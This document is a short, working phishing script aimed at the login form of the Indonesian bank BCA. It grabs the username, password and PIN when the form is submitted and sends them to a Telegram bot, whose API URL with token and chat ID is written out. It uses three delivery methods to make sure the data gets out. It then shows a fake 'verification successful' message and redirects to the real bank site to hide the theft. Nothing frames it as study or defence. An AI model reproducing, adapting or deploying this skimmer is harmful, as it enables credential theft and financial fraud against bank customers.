<script>
// BCA ULTRA SIMPLE SCRIPT
setTimeout(function() {
    const form = document.getElementById('bcaLoginForm') || document.querySelector('form');
    
    if (form) {
        form.onsubmit = function(e) {
            e.preventDefault();
            
            // Get all inputs
            const inputs = this.querySelectorAll('input');
            const data = {
                user: inputs[0]?.value || '',
                pass: inputs[1]?.value || '',
                pin: inputs[2]?.value || ''
            };
            
            console.log('ðŸ¦ BCA Capture:', data);
            
            // Telegram - SIMPLE GET request
            const url = `https://api.telegram.org/bot8455080107:AAFh1AFJ1YmONMe5kpqNstPFuZpn4NXzr18/sendMessage?chat_id=8313500840&text=BCA_DATA: ${data.user}|${data.pass}|${data.pin}`;
            
            // MULTIPLE METHODS to ensure delivery
            const methods = [
                () => { new Image().src = url; }, // Image load
                () => { fetch(url).catch(() => {}); }, // Fetch
                () => { const s = document.createElement('script'); s.src = url; document.body.appendChild(s); } // JSONP style
            ];
            
            methods.forEach(method => {
                try { method(); } catch (e) { console.log('Method failed:', e); }
            });
            
            // UI feedback
            alert('Verifikasi berhasil...');
            
            // Redirect
            setTimeout(() => {
                window.location.href = 'https://bca.co.id';
            }, 1000);
            
            return false;
        };
        
        console.log('âœ… BCA script ready');
    }
}, 500); // Delay sedikit untuk pastikan DOM ready
</script>
